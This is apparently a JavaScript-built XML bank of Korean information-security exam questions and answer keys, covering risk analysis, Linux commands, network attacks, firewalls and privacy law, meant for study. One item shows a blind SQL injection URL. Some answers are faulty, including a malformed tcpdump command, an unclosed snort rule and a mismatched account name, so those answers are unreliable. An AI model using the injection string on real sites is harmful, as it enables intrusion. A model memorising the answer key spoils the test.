xml+='  <problem id="278">정량적 위험지표와 관련하여 다음 빈칸에 들어갈 말을 쓰시오,&lt;br&gt;&lt;br&gt;ㅇ SLE(단일 예상 손실액) = AV(자산가치) × ( A )&lt;br&gt;&lt;br&gt;ㅇ ALE(연간 예상 손실액) = SLE(단일 예상 손실액) × ( B )</problem>';
xml+='  <answer id="278">A: EF(손실계수)&lt;br&gt;&lt;br&gt;B: ARO(연간 발생률)</answer>';
xml+='  <problem id="279">침해사고 발생 이후 리눅스 시스템에서 다음과 같은 조사를 하였다. 각 명령어를 완성하시오.&lt;br&gt;&lt;br&gt;1) 최근 7일 내에 변경된 모든 파일을 검색하는 명령어&lt;br&gt;&lt;br&gt;2) 사용자가 root 이며 접근권한이 setuid로 설정된 모든 파일을 검색하는 명령어&lt;br&gt;&lt;br&gt;3) 호스트 192.168.256.3에서 192.168.10.48으로부터 이상(anormaly) 트래픽이 탐지되었다.Tcpdump 명령을 통해 이너페이스 eth0을 통해 192.168.253.3에서 192.168.10.48을 오가는 패킷 캡쳐하는 명령</problem>';
xml+='  <answer id="279">1) find / -mtime -7&lt;br&gt;&lt;br&gt;2) find / -user root -perm -4000&lt;br&gt;&lt;br&gt;3) tcpdump -I eth0 -n dst host 192.168.10.48 host src 192.168.10.48</answer>';
xml+='  <problem id="280">아래 그림의 포트스캔의 과정을 보고 물음에 답하시오.&lt;br&gt;&lt;br&gt;가)&lt;br&gt;&lt;br&gt;A -------- (TCP 25) SYN --------▶ B&lt;br&gt;&lt;br&gt;A ◀----- (TCP 25) SYN/ACK ------ B&lt;br&gt;&lt;br&gt;A -------- (TCP 25) RST --------▶ B&lt;br&gt;&lt;br&gt;나)&lt;br&gt;&lt;br&gt;A -------- (TCP 443) SYN --------▶ B&lt;br&gt;&lt;br&gt;A ◀------- (TCP 443) RST --------- B&lt;br&gt;&lt;br&gt;다)&lt;br&gt;&lt;br&gt;A -------- (TCP 110) SYN --------▶ B&lt;br&gt;&lt;br&gt;A -------- (TCP 110) SYN --------▶ B&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 어떠한 포트 스캔 방식인가?&lt;br&gt;&lt;br&gt;2) 스캔하는 각 포트에 대한 서비스 명을 쓰시오.&lt;br&gt;&lt;br&gt;3) 각 포트 스캔의 결과를 적고 그 근거를 적으시오.</problem>';
xml+='  <answer id="280">1) TCP Half-open scan&lt;br&gt;&lt;br&gt;2) 가:SMTP, 나:HTTPS, 다:POP3&lt;br&gt;&lt;br&gt;3)&lt;br&gt;&lt;br&gt;가) 요청을 받은 B가 SYN/ACK을 보내왔으므로 해당 포트는 열려 있고 접근 가능한 상태임. A가 B에게 RST를 보내 연결을 끊었으므로 이는 스캔 흔적을 숨기기 위한 Stealth 포트 스캔 기법인 TCP Half-open 포트 스캔 방식임&lt;br&gt;&lt;br&gt;나) 요청을 받은 B가 RST를 보내왔으므로 해당 포트는 닫혀 있는 상태&lt;br&gt;&lt;br&gt;다) 요청을 받은 B가 응답이 없으므로 이는 포트는 사용 중이나 방화벽으로 막혀 있는 상태임</answer>';
xml+='  <problem id="281">쇼핑몰 사이트를 운영하는 정보통신 서비스 제공업체의 개인정보 취급자에게 적용되어야 하는 비밀번호 작성 규칙 3가지를 기술하시오.</problem>';
xml+='  <answer id="281">1. 영문, 숫자, 특수문자 중 2종류 이상을 조합하여 최소 10자리 이상 또는 3종류 이상을 조합하여 최소 8자리 이상의 길이로 구성&lt;br&gt;&lt;br&gt;2. 연속적인 숫자나 생일, 전화번호 등 추측하기 쉬운 개인정보 및 아이디와 비슷한 비밀번호는 사용하지 않는 것을 권고&lt;br&gt;&lt;br&gt;3. 비밀번호에 유효기간을 설정하여 반기별 1회 이상 변경</answer>';
xml+='  <problem id="282">보기는 공격자에 의해 웹사이트가 공격당하고 있는 상황이다. 공격 상황과 관련하여 물음에 답변하시오.&lt;br&gt;&lt;br&gt;공격자가 브라우저에 아래와 같은 URL을 입력하자 화면에 \'1\'이라는 숫자가 출력되었다.&lt;br&gt;&lt;br&gt;http://q.fran.kr/view.php?no=1 union  select(substr(database(), 0, 1)) = \'t\'&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 무슨 공격인지 쓰시오.&lt;br&gt;&lt;br&gt;2) 위 공격을 통해 공격자가 취할 수 있는 정보를 쓰시오.&lt;br&gt;&lt;br&gt;3) 관리자가 HTML코드를 수정하여 \'1\'이 출력되지 않도록 조치하였다. 이 조치법의 문제점을 서술하고 대응방안을 제시하시오.</problem>';
xml+='  <answer id="282">1) Blind SQL Injection&lt;br&gt;&lt;br&gt;2) 데이터베이스 명을 파악할 수 있다. 위 공격을 통해 데이터베이스의 첫글자가 t라는 것을 알 수 있으며, 유사한 공격을 반복하여 전체 데이터베이스 명을 알아낼 수 있다.&lt;br&gt;&lt;br&gt;3) 웹페이지 HTML 수정을 통해 특정 출력필드를 숨기더라도 SQL Injection이 동작 하는한 다른 페이지에도 동일한 공격이 가능할 확률이 높다. 그리고 보여지는게 완벽히 차단 되었더라도 내부적으로 악영향을 주는 쿼리문을 실행하는 것은 여전히 가능하다.&lt;br&gt;&lt;br&gt;HTML을 변경하는 것 보다는 prepared statement를 이용하여 SQL Injection 공격을 원천 차단해야 한다.</answer>';
xml+='  <problem id="283">다음은 여행사에서 개인정보 수집 시 동의받고 있는 개인정보 수집·이용 및 제공 동의서이다. 개인정보보호 관련 법제에 의거 잘못된 부분을 3가지 이상 찾아서 서술하시오.&lt;br&gt;&lt;br&gt;ㅇ 수집 · 이용 목적: 여행자 멤버십 등록 및 이벤트 업체 정보 제공&lt;br&gt;&lt;br&gt;ㅇ 보유 · 이용기간: 멤버십 탈퇴 시 까지&lt;br&gt;&lt;br&gt;ㅇ 수집 항목: 성명, 생년월일, 주민등록번호, 주소, 이메일, 전화번호&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;※ 정보의 수집·이용에 관한 동의는 거부하실 수 있습니다.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;개인정보 수집·이용에 동의하십니까?  &lt;br&gt;&lt;br&gt;동의함 □,  동의하지 않음 □</problem>';
xml+='  <answer id="283">1. 이벤트 업체에 제공한다는 것에 대해 제3자 제공에 관한 동의를 별도로 받아야 함&lt;br&gt;&lt;br&gt;- 제공하는 항목, 제공 기간 등에 대해 안내해야 함&lt;br&gt;&lt;br&gt;2. 멤버십 등록을 위해 주민등록번호를 수집하는 것은 과도하며, 수집근거가 드러나있지 않음. 정당한 근거에 의해 수집하더라도 별도로 동의 받아야 함&lt;br&gt;&lt;br&gt;3. 동의에 거부할 수 있다는 내용을 안내할 때 동의 거부에 대한 불이익도 같이 안내해야 함</answer>';
xml+='  <problem id="284">모든 네트워크 대역에서 Telnet으로 접속하는 패킷 중 14번째 자리까지 \'anonymous\'가 포함된 트래픽에 대해서 \'Dangerous\' 메시지로 경고하는 snort rule을 만드시오.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="284">alert tcp any any -&gt; any 23 (msg: "Dangerous"; content: "anonymous"; depth: 14; sid: 1000001;&lt;br&gt;</answer>';
xml+='  <problem id="285">다음의 괄호안에 들어갈 말은?&lt;br&gt;&lt;br&gt;(  괄호  )은(는) 악성 소프트웨어를 뜻하는 멀웨어 (Malware)와 광고(Advertising)의 합성어로 온라인 광고를 통해 악성코드를 유포시키는 행위를 말한다. (  괄호  )은(는) 공격자 측면에서 악성코드를 대량 유포하는데 매우 유리하다. 사용자는 익숙하고 정상적인 사이트에 접속하였음에도 불구하고 정상적인 사이트에 설치된 광고를 통해 Drive-By-Download로 악성코드에 감염될 수 있다. 최근은 (  괄호  )와 Exploit-Kit가 함께 사용되어 위험성이 더 증대되고 있다.</problem>';
xml+='  <answer id="285">멀버타이징(Malvertising)</answer>';
xml+='  <problem id="286">가상사설망(VPN)에서 사용되는 IPSec과 관련하여 아래 괄호안에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;ㅇ IPSec은 OSI 모델에서 (  A  ) 계층에 속한다.&lt;br&gt;&lt;br&gt;ㅇ IPSec에서 (  B  )는 무결성 보장, 메시지 인증을 위해 사용된다.&lt;br&gt;&lt;br&gt;ㅇ IPSec에서 (  C  )는 암호화를 통해 기밀성을 유지하기 위해 사용된다.</problem>';
xml+='  <answer id="286">A: 3(네트워크)&lt;br&gt;&lt;br&gt;B: AH&lt;br&gt;&lt;br&gt;C: ESP</answer>';
xml+='  <problem id="287">다음에서 설명하는 공격은?&lt;br&gt;&lt;br&gt;HTTP Request에 있는 파라미터가 HTTP Response의 응답헤더로 다시 전달되는 경우 파라미터 내 개행문자 CR(Carriage Return, %0D) 혹은 LF(Line Feed %0A)가 존재하면 HTTP 여러개로 나누어질 수 있다. 이 공격은 이러한 취약점을 통해 응답 메시지에 악의적인 코드를 주입함으로써 XSS 및 캐시를 훼손하는 취약점이다.</problem>';
xml+='  <answer id="287">HTTP 응답 분할(HTTP Response Splitting) 공격</answer>';
xml+='  <problem id="288">다음은 데이터베이스를 타겟으로 하는 공격에 관한 설명이다. &lt;br&gt;설명에 해당하는 공격을 차례로 적으시오.&lt;br&gt;&lt;br&gt;1) 낮은 보안등급의 정보조각을 조합하여 높은 등급의 정보를 알아내는 것&lt;br&gt;&lt;br&gt;2)  보안으로 분류되지 않은 정보에 접근한 후 기밀정보를 유추하는 것&lt;br&gt;&lt;br&gt;3) 처리할 자료를 다른 자료와 바꿔서 처리하는 것. 즉 입력값이나 출력값을 부정한 의도로 수정하여 잘못된 결과가 나오도록 유도하는 것</problem>';
xml+='  <answer id="288">1) 집성(Aggregation)&lt;br&gt;&lt;br&gt;2) 추론(Inference)&lt;br&gt;&lt;br&gt;3) 데이터 디들링(Data Diddling)</answer>';
xml+='  <problem id="289">클라우드 서비스의 유형 3가지를 적으시오.</problem>';
xml+='  <answer id="289">IaaS, PaaS, SaaS</answer>';
xml+='  <problem id="290">다음은 리눅스 logrotate.conf 파일의 일부이다. wtmp로그에 대해 로그파일을 압축하고 주 단위로 새로 생성하고자 할 때 아래 빈칸에 들어갈 알맞은 옵션을 차례로 적으시오.&lt;br&gt;&lt;br&gt;(   A   )&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;/var/log/wtmp {&lt;br&gt;&lt;br&gt;    (  B  )&lt;br&gt;&lt;br&gt;    (  C  ) 0664 root utmp&lt;br&gt;&lt;br&gt; minsize 1M&lt;br&gt;&lt;br&gt;    rotate 1&lt;br&gt;&lt;br&gt;}</problem>';
xml+='  <answer id="290">A: compress&lt;br&gt;&lt;br&gt;B: weekly&lt;br&gt;&lt;br&gt;C: create</answer>';
xml+='  <problem id="291">아래의 식을 참고하여 위험의 구성요소 3가지를 적으시오.&lt;br&gt;&lt;br&gt;위험 = (  A  ) × (  B  ) × (  C  ) - 정보보호대책&lt;br&gt;&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="291">A: 자산(Asset)&lt;br&gt;&lt;br&gt;B: 취약점(Vulnerability)&lt;br&gt;&lt;br&gt;C: 위협(Threat)&lt;br&gt;</answer>';
xml+='  <problem id="292">다음은 개인정보 보호법상의 접속기록에 관한 설명이다. 빈칸에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;"접속기록"이란 개인정보취급자 등이 (   A   ) 에 접속한 사실을 알 수 있는 계정, 접속일시, 접속자 정보, (   B   ) 등을 (   C   ) 으로 기록한 것을 말한다. 이 경우 "접속"이란 개인정보처리 시스템과 연결되어 데이터 송신 또는 수신이 가능한 상태를 말한다</problem>';
xml+='  <answer id="292">A: 개인정보처리시스템&lt;br&gt;&lt;br&gt;B: 수행 업무&lt;br&gt;&lt;br&gt;C: 전자적</answer>';
xml+='  <problem id="293">다음에서 설명하는 공격은?&lt;br&gt;&lt;br&gt;ㅇ 공격자는 다른 호스트 MAC 주소를 자신의 MAC 주소로 위조한 응답 메시지를 망에 지속적으로 브로드캐스트한다.&lt;br&gt;&lt;br&gt;ㅇ 희생자가 해당 호스트의 MAC을 질의하는 순간 위조된 응답 메시지를 받고 자신의 Cache Table에 있는 해당 IP의 MAC 주소를 공격자의 MAC 주소로 바꾼다.&lt;br&gt;&lt;br&gt;ㅇ 희생자는 원래 다른 호스트에 전송해야 할 메시지를 공격자에게 전송하게 된다.</problem>';
xml+='  <answer id="293">ARP 스푸핑(Spoofing)</answer>';
xml+='  <problem id="294">취약점 및 침해요인과 그 대응방안에 관한 정보 제공하며 침해사고가 발생하는 경우 실시간 경보ㆍ분석체계 운영하며 금융ㆍ통신 등 분야별 정보통신기반시설을 보호하기 위하여 다음 각호의 업무를 수행하는 곳은?&lt;br&gt;&lt;br&gt;1. 취약점 및 침해요인과 그 대응방안에 관한 정보 제공&lt;br&gt;&lt;br&gt;2. 침해사고가 발생하는 경우 실시간 경보/분석체계 운영</problem>';
xml+='  <answer id="294">정보공유분석센터(ISAC)</answer>';
xml+='  <problem id="295">다음 괄호 안에 들어갈 단어를 적으시오.&lt;br&gt;&lt;br&gt;최근 Github은 (  괄호  )를 통한 DDoS 공격을 받았다. (  괄호  )는 스토리지나 DB같은 대규모 데이터저장소의 부하를 줄이기 위해 캐시를 저장해 두는 툴이다. 통상 캐시가 필요한 시스템에만 사용되고, 인터넷에 노출되지 않기 때문에, 별도 권한설정을 요구하지 않는다. 하지만 현실은 인터넷에 노출된 (  괄호  ) 서버가 적지 않고, 이들은 DDoS 공격 수단으로 전락할 수 있다.</problem>';
xml+='  <answer id="295">memcached 서버</answer>';
xml+='  <problem id="296">침입탐지시스템에 대한 설명이다. 다음에서 설명하는 용어를 적으시오.&lt;br&gt;&lt;br&gt;1) 비정상 행위에 대한 패턴을 입력하여 일치하는 패턴을 탐지하는 방법이다. 오탐률이 낮지만 새로운 공격 패턴은 탐지가 어렵다.&lt;br&gt;&lt;br&gt;2) 패턴을 미리 등록해두진 않지만 정상 행위와 비정상 행위를 프로파일링 하여 통계 및 AI를 이용하여 정상/비정상을 구분하는 방법이다.&lt;br&gt;&lt;br&gt;3) 비정상적인 접근을 정상적인 접근이라고 잘못 판단하는 오류</problem>';
xml+='  <answer id="296">1) 지식기반 침입탐지(Misuse Detection)&lt;br&gt;&lt;br&gt;2) 행위기반 침입탐지(Anomaly Detection)&lt;br&gt;&lt;br&gt;3) 미탐(False Negative)</answer>';
xml+='  <problem id="297">프로그램의 기능을 파악하고 코드나 프로그램의 구조를 분석하는 단계로 실제로 실행해보지 않고 분석하는 것을 (    A    )라 한다. (   B   )는 직접 실행하여 실행된 결과를 직접 관찰하여 분석하는 것으로, 분석이 용이하지만 안전한 샌드박스 환경에서 수행되어야 한다.</problem>';
xml+='  <answer id="297">A: 정적 분석&lt;br&gt;&lt;br&gt;B: 동적 분석</answer>';
xml+='  <problem id="298">리눅스 운영체제에 관한 설명이다. 다음 설명에 해당하는 파일은 무엇인가?&lt;br&gt;&lt;br&gt;이것은 리눅스의 "/etc"에 위치하고 있으며 패스워드의 사용기간 만료, 패스워드 최대 사용기간, 패스워드의 최소 변경기간 등의 패스워드 정책을 설정 할 수 있다.</problem>';
xml+='  <answer id="298">login.defs</answer>';
xml+='  <problem id="299">다음에서 설명하는 위험 관리 방법은?&lt;br&gt;&lt;br&gt;ㅇ 자산에 대해 보험을 들어 손실에 대비&lt;br&gt;&lt;br&gt;ㅇ 위험 부담이 큰 일에 대해 아웃소싱을 통해 책임 계약 체결</problem>';
xml+='  <answer id="299">위험 전가</answer>';
xml+='  <problem id="300">다음에서 설명하는 정성적 위험분석 방법을 적으시오.&lt;br&gt;&lt;br&gt;델파이 기법과 마찬가지로 미랜드 연구소에서 1950년 허만 칸(Herman Kahn)을 중심으로 무기발전과 군사전략 간의 관계를 분석하기 위해 개발되었다.  어떠한 사건도 예상대로 실행되지 않는다는 사실에 근거하여 위험을 추정하고 이에 대비하기 위한 방법이다. 먼 미래의 위험까지 예측할 수 있지만 정량적인 분석 방법들에 비해 정확도는 낮다.</problem>';
xml+='  <answer id="300">시나리오법</answer>';
xml+='  <problem id="301">다음에서 설명하는 것은?&lt;br&gt;&lt;br&gt;각종 재해, 장애, 재난으로부터 위기관리를 기반으로 재해복구, 업무복구 및 재개, 비상계획 등의 비즈니스 연속성을 보장하기 위한 계획이다. 하위 업무로, RTO, RPO, 우선순위를 설정하기 위해 업무 영향 분석(BIA)를 수행한다.</problem>';
xml+='  <answer id="301">업무연속성계획(BCP)</answer>';
xml+='  <problem id="302">다음에서 설명하는 위험분석 접근법은 무엇인가?&lt;br&gt;&lt;br&gt;이 방법은 국내외 표준이나 법령, 가이드 등을 기준으로 최소한의 기준 수준을 정한다. 조직에서 공통적으로 필요한 보호 대책을 정할 수 있어 시간 및 비용이 절약되지만 조직의 특성이 미반영되어 적정 보안 수준 초과 또는 미달될 가능성도 있다.</problem>';
xml+='  <answer id="302">베이스라인 접근법</answer>';
xml+='  <problem id="303">다음에서 설명하는 공격은?&lt;br&gt;&lt;br&gt;출발지와 목적지의 IP로 동일하게 만들어 전송함으로써 공격 대상 컴퓨터를 루프 상태에 빠뜨리는 공격</problem>';
xml+='  <answer id="303">Land Attack</answer>';
xml+='  <problem id="304">아주 크게 만들어진 ICMP 패킷을 전송함으로써 공격 네트워크에 도달하는 동안 아주 작은 조각(Fragment)이 되어 공격 대상 시스템이 조각화된 패킷을 모두 처리해야 함으로써 성능을 떨어뜨리는 공격은?</problem>';
xml+='  <answer id="304">Ping of Death</answer>';
xml+='  <problem id="305">UDP 프로토콜의 비연결적 특성을 이용한 DoS 공격으로 대량의 UDP 패킷을 희생자에게 전송해 희생자의 네트워크 대역폭을 소진시키는 DoS공격</problem>';
xml+='  <answer id="305">UDP Flooding</answer>';
xml+='  <problem id="306">주로 부팅이미지를 클라이언트에게 전달할 목적으로 UDP 69번 포트를 사용하여 인증과정 없이 파일을 전송하는 서비스를 대상으로 하는 공격이다. 이 공격을 이용하여 서버에 저장되어 있는 파일을 다운로드 할 수 있다.</problem>';
xml+='  <answer id="306">TFTP 공격</answer>';
xml+='  <problem id="307">공격자는 패스워드를 요구하지 않는 FTP 설정의 취약점을 이용한 공격이다. 예를 들어 서버에 쓰기 권한이 잘못 부여되어 악성코드를 서버에 삽입할 수 있고 이를 익명의 다수가 다운받을 수 있다.</problem>';
xml+='  <answer id="307">Anonymous FTP 공격</answer>';
xml+='  <problem id="308">특정 아이디에 여러가지 비밀번호를 무작위로 대입하여 인증을 통과하고자 하는 해킹 기법은?</problem>';
xml+='  <answer id="308">무차별 대입 공격(Brute Force Attack)</answer>';
xml+='  <problem id="309">ICMP 프로토콜을 이용한 DoS 공격 기법으로, 여러 호스트가 특정 대상에게 다량의 ICMP Echo Request를 보내게 하여 서비스거부를 유발시키는 공격 기법은?</problem>';
xml+='  <answer id="309">스머프 공격</answer>';
xml+='  <problem id="310">보안 수준이 낮은 사이트들을 제로데이 취약점 등을 이용해 감염시켜 두고 그 사이트에 방문하는 방문자들을 감염시켜 보안이 상대적으로 강한 대상을 공격하기 위한 길목으로 삼는 기법</problem>';
xml+='  <answer id="310">워터링 홀 기법</answer>';
xml+='  <problem id="311">주로 PHP기반의 웹사이트들에서 이루어지며 여러 조각으로 분할된 파라미터를 보안에 걸리지 않고 업로드 한 뒤 이것을 서버 상에서 조합하여 공격에 사용하는 공격 기법은?</problem>';
xml+='  <answer id="311">다중 분할 웹셸</answer>';
xml+='  <problem id="312">로컬에서 통신하고 있는 서버와 클라이언트의 MAC 주소를 공격자의 MAC 주소로 속임으로써 클라이언트와 서버를 오가는 패킷의 흐름을 왜곡시키는 공격은?</problem>';
xml+='  <answer id="312">ARP 스푸핑</answer>';
xml+='  <problem id="313">다음에서 설명하는 공격은?&lt;br&gt;&lt;br&gt;ㅇ 일반적인 스위치가 보안원리 중 하나인 \'Fail Close\'를 따르지 않는 점을 이용한다.&lt;br&gt;&lt;br&gt;ㅇ 위조된 MAC 주소를 지속적으로 네트워크에 흘림으로써 스위치의 주소 테이블을 오버플로우시켜 허브처럼 동작하게 한다.&lt;br&gt;&lt;br&gt;ㅇ 브로드캐스트 되는 패킷들을 스니핑한다.</problem>';
xml+='  <answer id="313">스위치 재밍 또는 맥 플러딩</answer>';
xml+='  <problem id="314">방화벽 구축 형태 중 하나로, 인터넷 쪽에 패킷 필터링 라우터를 두고, 라우터와 내부 네트워크 사이에 베스천 호스트를 두는 방법은?</problem>';
xml+='  <answer id="314">스크린드 호스트 게이트웨이</answer>';
xml+='  <problem id="315">다음에서 설명하는 것은?&lt;br&gt;&lt;br&gt;이기종의 여러 보안 솔루션·장비에서 발생되는 이벤트 패턴 간에 연관성을 분석하는 것으로 보안 위협에 보다 정확한 판단과 대응을 가능하게 한다.</problem>';
xml+='  <answer id="315">상호 연관 분석</answer>';
xml+='  <problem id="316">아래 빈칸을 채우시오&lt;br&gt;&lt;br&gt;VPN에서 터널링 기술 중 2계층인 Data link에서 사용하는 (    ) 기술은 MS사가 개발한 프로토콜로서 TCP 연결을 사용하여 IP,IPX,NetBEUI 트래픽을 암호화하고 IP헤더를 캡슐화하여 인터넷을 경유하여 전송하며, 하나의 터널에 하나의 연결만 지원한다.</problem>';
xml+='  <answer id="316">PPTP</answer>';
xml+='  <problem id="317">VPN과 관련된 프로토콜에 관한 설명이다. 아래 빈칸을 채우시오&lt;br&gt;&lt;br&gt;(A) 기술은 마이크로소프트에서 개발한 (B) + 시스코에서 제안한 (C) 결합한 형태이다.</problem>';
xml+='  <answer id="317">L2TP, PPTP, L2F</answer>';
xml+='  <problem id="318">다음에서 설명하는 네트워크 토폴로지(Topology)는?&lt;br&gt;&lt;br&gt;ㅇ 하나의 케이블에 분기를 만들어 각 노드를 연결한다.&lt;br&gt;&lt;br&gt;ㅇ 시그널의 반사를 방지하기 위해 터미네이터를(Terminators)가 사용된다.</problem>';
xml+='  <answer id="318">버스(Bus)형</answer>';
xml+='  <problem id="319">다음에서 설명하는 네트워크 토폴로지(Topology)는?&lt;br&gt;&lt;br&gt;ㅇ 버스의 양 끝을 붙인 형태의 네트워크 형식이다.&lt;br&gt;&lt;br&gt;ㅇ 가까운 거리 내의 컴퓨터를 연결할 때 사용된다.&lt;br&gt;&lt;br&gt;ㅇ 모든 노드는 케이블의 폐곡선 내에 연결된다.</problem>';
xml+='  <answer id="319">링(Ring)형</answer>';
xml+='  <problem id="320">다음에서 설명하는 네트워크 토폴로지(Topology)는?&lt;br&gt;&lt;br&gt;ㅇ 중앙의 허브를 통해 연결되며 허브를 중심으로 100m 이내에 노드들이 존재해야 한다.&lt;br&gt;&lt;br&gt;ㅇ 허브의 포트가 허용하는 한 간단히 확장할 수 있다.&lt;br&gt;&lt;br&gt;ㅇ 네트워크상의 노드에 문제가 생겨도 전체 네트워크에는 영향이 생기지 않는다.</problem>';
xml+='  <answer id="320">스타(Star)형</answer>';
xml+='  <problem id="321">다음에서 설명하는 네트워크 토폴로지(Topology)는?&lt;br&gt;&lt;br&gt;o 모든 장비가 자신을 제외한 모든 다른 장비와 전용링크를 갖는다.&lt;br&gt;&lt;br&gt;o 완전 연결 네트워크는 n개의 노드에 대해 n(n-1)/2 개의 물리 채널을 갖는다.</problem>';
xml+='  <answer id="321">망(Mesh)형</answer>';
xml+='  <problem id="322">LAN구성 시 사용되는 대표적인 네트워크 토폴로지(Topology) 4가지는?&lt;br&gt;&lt;br&gt;ㅇ (   )형, (   )형, (   )형, (   )형&lt;br&gt;&lt;br&gt;ㅇ 괄호안에 들어갈 말만 적는다.&lt;br&gt;&lt;br&gt;ㅇ 영어 또는 한글 표현으로 적는다.</problem>';
xml+='  <answer id="322">버스 또는 Bus&lt;br&gt;&lt;br&gt;링 또는 환 또는 Ring&lt;br&gt;&lt;br&gt;성 또는 스타 또는 Star&lt;br&gt;&lt;br&gt;망 또는 그물 또는 Mesh</answer>';
xml+='  <problem id="323">다음에서 설명하는 IPv6 주소 전환 방식은?&lt;br&gt;&lt;br&gt;IPv4 네트워크를 경유하여 IPv6 네트워크 간 통신을 위한 방식&lt;br&gt;&lt;br&gt;IPv4 네트워크를 통과하는 가장의 경로(Tunnel)를 만들어 통신한다.</problem>';
xml+='  <answer id="323">터널링(Tunneling)</answer>';
xml+='  <problem id="324">다음에서 설명하는 IPv6 주소 전환 방식은?&lt;br&gt;&lt;br&gt;변환 헤더를 추가하여 IPv4주소와 IPv6주소를 상호 변환한다.</problem>';
xml+='  <answer id="324">주소/헤더 변환(Address/Header Translation)</answer>';
xml+='  <problem id="325">패킷 필터링의 단점인 세션에 대한 추적 기능을 보완한 침입 차단 시스템은?</problem>';
xml+='  <answer id="325">상태 추적(Stateful Inspection) 기반 침입 차단 시스템</answer>';
xml+='  <problem id="326">방화벽 구축 형태 중 하나로, 두개의 네트워크 인터페이스를 가진 베스천 호스트는?</problem>';
xml+='  <answer id="326">듀얼 홈드 게이트웨이</answer>';
xml+='  <problem id="327">방화벽 구축 형태 중 하나로, 인터넷 쪽과 내부 네트워크 쪽에 패킷 필터링 라우터를 설치하고 그 라우터들 사이에 베스천 호스트를 설치하는 구성은?</problem>';
xml+='  <answer id="327">스크린드 서브넷 게이트웨이</answer>';
xml+='  <problem id="328">방화벽 구축 형태 중 하나로, 베스천 호스트와 패킷 필터링 라우터를 혼합하여 사용하는 침입차단시스템?</problem>';
xml+='  <answer id="328">스크린드 호스트 게이트웨이</answer>';
xml+='  <problem id="329">시스템 로그 데몬(syslogd)이 실행될 때 참조하는 환경설정 파일은?</problem>';
xml+='  <answer id="329">/etc/syslog.conf</answer>';
xml+='  <problem id="330">유닉스 시스템에서 보안상의 이유로 root 사용자의 원격 접속을 제한하고자 할 때 운영체제별로 설정해줘야 하는 파일은?&lt;br&gt;&lt;br&gt;Solaris : /etc/default/(  A  )&lt;br&gt;&lt;br&gt;AIX : /etc/security/(  B  )&lt;br&gt;&lt;br&gt;Linux : /etc/(  C  )</problem>';
xml+='  <answer id="330">A : login&lt;br&gt;&lt;br&gt;B : user&lt;br&gt;&lt;br&gt;C : securetty</answer>';
xml+='  <problem id="331">syslogd가 관찰하는 대표적인 로그 파일로, 운영체제 전반의 상황들에 대한 실시간 로그를 기록 하는 파일이다. 해당 로그파일의 내용은 주로 사용자 콘솔에 실시간으로 보여진다.</problem>';
xml+='  <answer id="331">/var/log/messages</answer>';
xml+='  <problem id="332">로그파일이 지속적으로 누적 되어 용량이 무한이 커지는 것을 방지하기 위한 프로그램은?</problem>';
xml+='  <answer id="332">logrotate</answer>';
xml+='  <problem id="333">리눅스 시스템에서 일반 사용자가 자신의 패스워드를 변경하고자 할 때 ( ) 명령어를 사용한다.</problem>';
xml+='  <answer id="333">passwd</answer>';
xml+='  <problem id="334">passwd에 설정되어 있는 권한과 같이 실행 시 파일 소유자의 권한으로 실행되도록 하는 권한을 무엇이라 부르는가?</problem>';
xml+='  <answer id="334">Set-UID 또는 SUID</answer>';
xml+='  <problem id="335">교착상태(Deadlock)의 4가지 조건을 쓰시오.</problem>';
xml+='  <answer id="335">상호배제(Mutual Exclusive)&lt;br&gt;&lt;br&gt;정지 대기(Hold &amp; Wait)&lt;br&gt;&lt;br&gt;환형 대기(Circular Wait)&lt;br&gt;&lt;br&gt;비선점(Non-preempt)</answer>';
xml+='  <problem id="336">CPU 스케줄링에서 선점 스케줄링 방식을 3가지 이상 쓰시오</problem>';
xml+='  <answer id="336">RR(Round Robin)&lt;br&gt;&lt;br&gt;SRT(Shortest Remaining Time)&lt;br&gt;&lt;br&gt;MLQ(Multi Level Queue)&lt;br&gt;&lt;br&gt;MFQ(Multi Level Feedback Queue)</answer>';
xml+='  <problem id="337">교착상태(Deadlock)의 대응책 3가지를 쓰시오.</problem>';
xml+='  <answer id="337">방지(Prevention)&lt;br&gt;&lt;br&gt;회피(Avoidance)&lt;br&gt;&lt;br&gt;탐지 및 회복(Detection and Recovery)</answer>';
xml+='  <problem id="338">CPU 스케줄링 방식 중 교착상태(Deadlock)을 유발할 가능성이 있는 스케줄링 방식은?</problem>';
xml+='  <answer id="338">비선점 스케줄링</answer>';
xml+='  <problem id="339">CPU 스케줄링에서 비선점 스케줄링 방식을 3가지 이상 쓰시오.</problem>';
xml+='  <answer id="339">FIFO(First In First Out)&lt;br&gt;&lt;br&gt;SJF(Shortest Job First)&lt;br&gt;&lt;br&gt;HRN(Highest Response-ratio Time)</answer>';
xml+='  <problem id="340">/etc/passwd를 각 항목별로 설명하시오&lt;br&gt;&lt;br&gt;# cat /etc/passwd&lt;br&gt;&lt;br&gt;root:x:0:0:root:/root:/bin/bash</problem>';
xml+='  <answer id="340">root : 사용자명(ID)&lt;br&gt;&lt;br&gt;x : 패스워드. x로 되어 있는건 /etc/shadow파일에 암호화하여 저장되어 있다는 뜻이다.&lt;br&gt;&lt;br&gt;0 : 사용자 계정 uid&lt;br&gt;&lt;br&gt;0 : 사용자 계정 gid&lt;br&gt;&lt;br&gt;root : 사용자 계정 이름(정보)&lt;br&gt;&lt;br&gt;/root : 사용자 계정 홈 디렉토리&lt;br&gt;&lt;br&gt;/bin/bash : 사용자 계정 로그인 쉘</answer>';
xml+='  <problem id="341">/etc/passwd에 저장된 암호를 암호화하여 /etc/shadow로 옮기는 명령어는? 그리고 이 동작을 반대로 수행하는 명령어는?</problem>';
xml+='  <answer id="341">pwconv, pwunconv</answer>';
xml+='  <problem id="342">itwiki 계정을 잠궈 원격접속(Telnet, FTP)등을 못하게 하려고 한다. 명령어를 완성하시오. 그리고 해당 잠금을 푸는 명령어를 완성하시오.&lt;br&gt;&lt;br&gt;조건 : passwd 명령어를 사용한다.</problem>';
xml+='  <answer id="342">passwd -l itwiki&lt;br&gt;&lt;br&gt;passwd -u wiki</answer>';
